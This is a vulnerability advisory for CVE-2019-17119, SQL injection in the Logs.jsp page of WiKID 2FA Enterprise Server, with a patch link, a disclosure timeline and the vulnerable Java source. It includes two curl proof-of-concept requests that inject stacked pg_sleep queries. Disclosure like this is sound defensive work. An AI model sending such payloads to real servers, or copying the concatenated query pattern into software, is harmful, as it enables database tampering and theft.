Multiple SQL Injection vulnerabilities, CVE-2019-17119, were identified on `WiKID Systems 2FA Enterprise Server` through version `4.2.0-b2053`.  The <var>substring</var> and <var>source</var> parameters, used by **Logs.jsp**, are not sanitized thus allowing an authenticated user to create, read, update, or delete arbitrary information in the database.  

## Patch

* **4.2.0.b2053**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2053-1.noarch.rpm>

## Timeline

* 26 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032`
* 29 Sep 2019 - Issue disclosed to WiKID Systems
* 09 Oct 2019 - Issue confirmed by WiKID Systems, Patch released
* 16 Oct 2019 - Public Disclosure

## Description

Reviewing the source code for **Logs.jsp** revealed the following code blocks:

~~~
192     private String createSourceFilter(HttpServletRequest request) {
193         String source = getLogConfig(request).get("source");
194         if (source == null || "None".equals(source)) {
195             return " ";
196         }
197         return " and logger_name = '" + source + "' ";
198     }
199 
200     private String createSubStringFilter(HttpServletRequest request) {
201         String subString = getLogConfig(request).get("subString");
202         if (subString == null || subString.trim().length() == 0) {
203             return " ";
204         }
205         return " and rendered_message like '%" + subString + "%' ";
206     }
~~~

`createSourceFilter` reads the <var>source</var> parameter and includes the value in a query being constructed; `createSubStringFilter` reads the <var>substring</var> parameter and includes the value in a query that is being constructed.

The following queries can be used to demonstrate the parameters are vulnerable, the queries take advantage of Postgres Stacked Queries and issue a secondary request that causes the database and application to delay for 5+ seconds:

~~~
time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE" --data-binary "source='; select pg_sleep(5);--" https://$RHOST/WiKIDAdmin/Log.jsp

real    0m10.572s
user    0m0.008s
sys     0m0.016s
~~~

~~~
time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE" --data-binary "subString='; select pg_sleep(5);--" https://$RHOST/WiKIDAdmin/Log.jsp

real    0m10.572s
user    0m0.008s
sys     0m0.016s
~~~
